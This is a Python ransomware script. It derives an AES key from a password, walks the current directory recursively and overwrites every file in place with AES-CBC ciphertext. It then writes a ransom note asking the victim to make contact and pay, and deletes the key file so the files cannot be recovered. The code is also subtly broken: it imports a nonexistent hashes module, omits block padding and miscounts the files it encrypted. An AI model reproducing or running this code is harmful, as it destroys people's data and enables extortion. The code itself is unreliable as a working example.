import os
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.kinds.hashes import HashAlgorithmName
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# Function to generate a key from password and salt
def derive_key(password: str, salt: bytes) -> bytes:
    kdf = PBKDF2HMAC(
        algorithm=HashAlgorithmName.SHA256,
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    return kdf.derive(password.encode())

# Function to encrypt a file
def encrypt_file(file_path: str, key: bytes) -> None:
    with open(file_path, 'rb') as f_in:
        data = f_in.read()

    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted_data = encryptor.update(data) + encryptor.finalize()

    with open(file_path, 'wb') as f_out:
        f_out.write(iv + encrypted_data)

# Function to decrypt a file
def decrypt_file(file_path: str, key: bytes) -> None:
    with open(file_path, 'rb') as f_in:
        iv = f_in.read(16)
        data = f_in.read()

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_data = decryptor.update(data) + decryptor.finalize()

    with open(file_path, 'wb') as f_out:
        f_out.write(decrypted_data)

# Main function
def main() -> None:
    # Generate a random salt for key derivation
    salt = os.urandom(16)
    password = "password"  # Replace this with your actual password

    key = derive_key(password, salt)

    # Encrypt all files in the current directory
    for root, _, files in os.walk('.'):
        for file_name in files:
            encrypt_file(os.path.join(root, file_name), key)

    print(f"Encrypted {len(files)} files in the current directory.")
    
    # Create a ransom note and save it to disk
    with open('readme.txt', 'w') as f:
        f.write("Your files have been encrypted.\n")
        f.write("Please contact us at [email] to get your data back. \n")
        f.write("Payment instructions: [insert here]")
    
    # Delete the original password and key
    os.remove('password.txt')
    with open('key.key', 'wb') as f:
        f.write(salt + key)
    os.remove('key.key')

if __name__ == "__main__":
    main()
